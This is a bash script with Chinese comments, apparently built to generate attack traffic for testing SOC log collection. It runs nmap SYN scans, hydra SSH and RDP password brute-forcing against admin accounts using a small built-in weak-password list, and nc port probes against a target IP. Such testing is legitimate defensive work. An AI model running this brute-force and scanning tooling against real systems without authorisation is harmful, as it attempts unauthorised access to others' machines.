#!/usr/bin/env bash
#
# 攻击模拟器 — 在攻击机 (Kali 或任意 Linux) 上运行
# 对受保护主机发起无害攻击流量，使受保护主机产生真实安全日志，
# 供 Windows 日志采集器/syslog 适配器转发到 SOC 平台审计。
#
# 用法:
#   ./attack-simulator.sh <受保护主机IP> [次数]
#   例: ./attack-simulator.sh 192.168.1.100 3
#
# 依赖: nmap, hydra (apt install -y nmap hydra)
set -euo pipefail

TARGET="${1:?用法: $0 <目标IP> [次数]}"
ROUNDS="${2:-3}"
PWD_LIST="/tmp/attack-pwd.txt"

echo "==> 目标: $TARGET  轮次: $ROUNDS"

# 生成小型弱口令表（避免等待 rockyou 全量爆破）
cat > "$PWD_LIST" <<'EOF'
admin
Admin123
password
123456
root
toor
test
guest
qwerty
letmein
EOF

for i in $(seq 1 "$ROUNDS"); do
    echo "===== 第 $i 轮攻击 ====="

    # 1. 端口扫描 (SYN 扫描前 100 端口)
    nmap -sS -T4 --top-ports 100 -oN "/tmp/nmap-$i.txt" "$TARGET" || true

    # 2. SSH 暴力破解（若目标开 22 端口）
    if nmap -sS -p 22 "$TARGET" 2>/dev/null | grep -q "open"; then
        hydra -l admin -P "$PWD_LIST" -t 4 -w 5 -o "/tmp/hydra-ssh-$i.txt" "ssh://$TARGET" || true
    fi

    # 3. RDP 暴力破解（若目标开 3389 端口，Windows 主机）
    if nmap -sS -p 3389 "$TARGET" 2>/dev/null | grep -q "open"; then
        hydra -l administrator -P "$PWD_LIST" -t 4 -w 5 -o "/tmp/hydra-rdp-$i.txt" "rdp://$TARGET" || true
    fi

    # 4. 一次性连接尝试（产生 FIREWALL_BLOCK / CONN_REFUSED 日志）
    nc -z -w 2 "$TARGET" 445 || true
    nc -z -w 2 "$TARGET" 22  || true

    echo "===== 第 $i 轮完成 ====="
    sleep 5
done

echo "==> 完成。攻击结果见 /tmp/nmap-*.txt /tmp/hydra-*.txt"
echo "==> 建议: 现在到 SOC 平台「日志中心」查看实时日志，观察审计与响应流程。"
